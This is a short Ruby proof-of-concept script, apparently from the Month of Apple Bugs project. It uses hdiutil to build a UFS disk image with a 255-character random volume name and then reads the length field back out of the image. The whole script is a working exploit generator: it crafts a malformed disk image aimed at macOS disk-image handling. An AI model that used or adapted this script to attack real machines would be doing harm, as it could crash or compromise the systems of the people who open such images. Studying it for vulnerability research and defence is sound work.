#!/usr/bin/ruby
# (c) 2006 LMH <lmh [at] infopull.com>.
#

require 'fileutils'
require 'zlib'

hdiutil = "/usr/bin/hdiutil"
dmgname = (ARGV[0] || "MOAB-09-01-2007.dmg")
dmgsize = (ARGV[1] || "200k")
filesys = (ARGV[2] || "UFS")
volname = ""

255.times do
  volname << (i = Kernel.rand(62); i += ((i < 10) ? 48 : ((i < 36) ? 55 : 61 ))).chr
end

FileUtils.rm_f(dmgname)
system "#{hdiutil} create #{dmgname} -size #{dmgsize} -fs #{filesys} -volname #{volname}"

puts "++ reading #{dmgname}..."
dmg_stream = File.read(dmgname)
dmg_vnsize = dmg_stream[0x9c10,0x9c14].unpack("C2")
puts "++ volname length at dmg: #{dmg_vnsize}"
puts "++ dmg size: #{dmg_stream.size} bytes."